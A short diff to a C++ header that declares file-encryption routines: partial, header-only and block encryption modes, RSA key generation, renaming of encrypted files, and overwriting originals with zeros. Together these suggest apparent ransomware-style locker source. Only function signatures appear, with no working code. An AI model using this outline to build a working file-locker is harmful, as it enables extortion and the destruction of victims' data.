@@ -4,7 +4,6 @@
 #include "locker.h"
 #include "structures.h"
 #include "pathsystem.h"
-#include "global_parameters.h"
 
 namespace filesystem
 {
@@ -15,7 +14,6 @@ namespace filesystem
 	bool OptionEncryptModePARTLY(PFILE_INFO FileInfo);
 	bool OptionEncryptModeHEADER(PFILE_INFO FileInfo);
 	bool OptionEncryptModeBLOCK(PFILE_INFO FileInfo);
-	bool DropRSAKey(WCHAR* Path, BYTE PublicKey[], BYTE PrivateKey[], DWORD SizeKey, DWORD p_SizeKey);
 	bool HandlerGenKeyPairRSA();
 	bool EncryptRSA(PFILE_INFO FileInfo);
 	bool FileCryptEncrypt(PFILE_INFO FileInfo);
@@ -29,12 +27,12 @@ namespace filesystem
 	void sort_hash_list(SLIST<HASH_LIST>* list);
 	bool nopHashSumFile(CRYPT_INFO* CryptInfo, DESC desc_file, char* Filename);
 	bool HashSumFile(CRYPT_INFO* CryptInfo, DESC desc_file, char* Filename);
-	bool hash_file(PCRYPT_INFO CryptInfo, char* fullpath, char* filename);
+	bool hash_file(PCRYPT_INFO CryptInfo, DESC desc, char* fullpath, char* filename);
 
 	char* NameMethodState(PCRYPT_INFO CryptInfo, PDRIVE_INFO data);
-	char* OptionNameStandart(char* Path, char* Filename, char* exst, char* FPath);
-	char* OptionNameHash(char* Path, char* Filename, char* exst, char* FPath);
-	char* OptionNameBase(char* Path, char* Filename, char* exst, char* FPath);
+	char* OptionNameStandart(PCRYPT_INFO CryptInfo, char* Path, char* Filename, char* exst, char* FPath);
+	char* OptionNameHash(PCRYPT_INFO CryptInfo, char* Path, char* Filename, char* exst, char* FPath);
+	char* OptionNameBase(PCRYPT_INFO CryptInfo, char* Path, char* Filename, char* exst, char* FPath);
 
 	bool nopOverWriteFile(CRYPT_INFO* CryptInfo, DESC desc_file, unsigned filesize);
 	bool ZerosOverWriteFile(CRYPT_INFO* CryptInfo, DESC desc_file, unsigned filesize);
